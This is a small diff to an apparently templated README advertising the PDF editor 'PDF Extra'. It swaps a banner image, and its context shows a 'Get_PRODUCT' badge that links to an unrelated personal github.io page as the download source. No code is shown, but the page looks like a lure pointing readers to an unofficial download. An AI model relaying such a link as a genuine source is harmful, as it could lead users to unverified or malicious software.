@@ -2,7 +2,7 @@
 
 > PDF Extra is a versatile PDF editor with cloud features for creating, editing, organizing, annotating, signing, and managing PDF documents. It provides a practical workspace for users who need convenient PDF Extra tools for document productivity, file organization, and everyday PDF workflows.
 
-![Banner Placeholder](https://i.ytimg.com/vi/O3k663c3sNk/maxresdefault.jpghttps://i.ytimg.com/vi/O3k663c3sNk/maxresdefault.jpg)
+![Banner Placeholder](https://images.wondershare.com/pdfelement/top-pdf-software/pdf-extra-review-and-its-best-alternative-01.jpg)
 
 [![Get PDF Extra Now](https://img.shields.io/badge/Get_PRODUCT-Now-0a5d8d?style=for-the-badge&logo=github)](https://parkesradloff1989.github.io/.github/PDF-Extra)
 
